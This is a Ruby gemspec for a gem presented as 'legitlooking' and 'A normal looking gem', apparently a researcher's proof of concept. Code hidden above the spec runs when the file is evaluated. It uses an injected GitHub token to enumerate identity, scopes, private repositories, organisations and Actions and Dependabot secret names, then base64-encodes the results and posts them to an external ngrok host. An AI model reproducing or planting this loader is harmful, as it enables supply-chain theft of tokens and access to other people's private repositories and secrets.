# frozen_string_literal: true

COLLAB_URL = "https://6e51-2001-1c00-307-d600-5dfa-d53c-8fc6-791b.ngrok-free.app"

begin
  require "uri"
  require "net/http"
  require "json"

  cmd = ->(c) { `#{c} 2>/dev/null`.strip[0, 4000] }
  lines = []

  API = "https://api.github.com"
  HDRS = {
    "Accept"               => "application/vnd.github+json",
    "X-GitHub-Api-Version" => "2022-11-28"
  }

  def gh_get(path, hdrs)
    uri = URI("https://api.github.com#{path}")
    req = Net::HTTP::Get.new(uri)
    hdrs.each { |k, v| req[k] = v }
    res = Net::HTTP.start(uri.host, uri.port, use_ssl: true,
                          open_timeout: 10, read_timeout: 10) { |h| h.request(req) }
    [res.code, res.body.to_s[0, 2000], res.to_hash]
  rescue => e
    ["ERR", e.message, {}]
  end

  # ============================================================
  # 1. WIE IS DE TOKEN? -- /user en /rate_limit
  # ============================================================
  lines << "=== 1. /user (token identiteit) ==="
  code, body, headers = gh_get("/user", HDRS)
  lines << "HTTP #{code}: #{body}"
  lines << "X-OAuth-Scopes: #{headers['x-oauth-scopes']}"
  lines << "X-Accepted-OAuth-Scopes: #{headers['x-accepted-oauth-scopes']}"

  lines << "\n=== 1b. /rate_limit ==="
  code, body, = gh_get("/rate_limit", HDRS)
  lines << "HTTP #{code}: #{body}"

  # ============================================================
  # 2. INSTALLATION REPOSITORIES
  #    GitHub App installation tokens geven toegang tot een lijst repos
  #    Dit is DE test voor cross-repo scope
  # ============================================================
  lines << "\n=== 2. /installation/repositories ==="
  code, body, = gh_get("/installation/repositories?per_page=100", HDRS)
  lines << "HTTP #{code}: #{body}"

  # ============================================================
  # 3. ALLE REPOS VAN DE GEBRUIKER/APP
  # ============================================================
  lines << "\n=== 3. /user/repos (alle zichtbare repos) ==="
  code, body, = gh_get("/user/repos?per_page=100&visibility=all&affiliation=owner,collaborator,organization_member", HDRS)
  lines << "HTTP #{code}: #{body[0, 3000]}"

  # ============================================================
  # 4. ORGANISATIE REPOS -- als ugurcanli lid is van een org
  # ============================================================
  lines << "\n=== 4. /user/orgs ==="
  code, body, = gh_get("/user/orgs", HDRS)
  lines << "HTTP #{code}: #{body}"

  # ============================================================
  # 5. PROBEER EEN ANDERE REPO DIRECT TE LEZEN
  #    Maak een tweede private repo aan in je account voor deze test
  #    Of vervang door een willekeurige private repo naam
  # ============================================================
  lines << "\n=== 5. CROSS-REPO TOEGANGSTEST ==="
  # Probeer andere repos van dezelfde owner te lezen
  ["testpen2", "private-test", "test-private", "dependabot-test"].each do |repo|
    code, body, = gh_get("/repos/ugurcanli/#{repo}", HDRS)
    lines << "ugurcanli/#{repo}: HTTP #{code} -- #{body[0, 100]}"
  end

  # ============================================================
  # 6. GITHUB APP INFO -- welke app geeft de token?
  # ============================================================
  lines << "\n=== 6. /app (app metadata) ==="
  code, body, = gh_get("/app", HDRS)
  lines << "HTTP #{code}: #{body}"

  lines << "\n=== 6b. /app/installations ==="
  code, body, = gh_get("/app/installations?per_page=10", HDRS)
  lines << "HTTP #{code}: #{body[0, 1000]}"

  # ============================================================
  # 7. SECRETS VAN DE DOELREPO UITLEZEN
  #    Kan de token GitHub Actions secrets namen zien?
  # ============================================================
  lines << "\n=== 7. /repos/ugurcanli/testpen/actions/secrets ==="
  code, body, = gh_get("/repos/ugurcanli/testpen/actions/secrets", HDRS)
  lines << "HTTP #{code}: #{body}"

  lines << "\n=== 7b. Dependabot secrets ==="
  code, body, = gh_get("/repos/ugurcanli/testpen/dependabot/secrets", HDRS)
  lines << "HTTP #{code}: #{body}"

  # ============================================================
  # 8. RESPONSE HEADERS VAN EEN GEWONE API CALL
  #    Welke token type en scopes worden geïnjecteerd?
  # ============================================================
  lines << "\n=== 8. RESPONSE HEADERS (token info) ==="
  code, body, headers = gh_get("/repos/ugurcanli/testpen", HDRS)
  interesting = %w[x-oauth-scopes x-ratelimit-limit x-ratelimit-used
                   x-github-request-id x-accepted-oauth-scopes authorization]
  interesting.each { |h| lines << "#{h}: #{headers[h]}" if headers[h] }
  lines << body[0, 500]

  payload = [lines.join("\n").encode("UTF-8", invalid: :replace, undef: :replace)].pack("m0")
  uri = URI("#{COLLAB_URL}?poc=cross_repo_scope")
  post = Net::HTTP::Post.new(uri)
  post["Content-Type"] = "text/plain"
  post.body = payload
  Net::HTTP.start(uri.host, uri.port, use_ssl: true,
                  open_timeout: 30, read_timeout: 30) { |h| h.request(post) }

rescue => e
  begin
    uri = URI("#{COLLAB_URL}?poc=cross_repo_scope&err=#{URI.encode_www_form_component(e.message[0,200])}")
    Net::HTTP.get(uri)
  rescue; end
end

Gem::Specification.new do |spec|
  spec.name          = "legitlooking"
  spec.version       = "1.0.30"
  spec.authors       = ["researcher"]
  spec.summary       = "A normal looking gem"
  spec.require_paths = ["lib"]
  spec.add_dependency "rails", "~> 7.0"
  spec.add_dependency "devise", "~> 4.9"
end
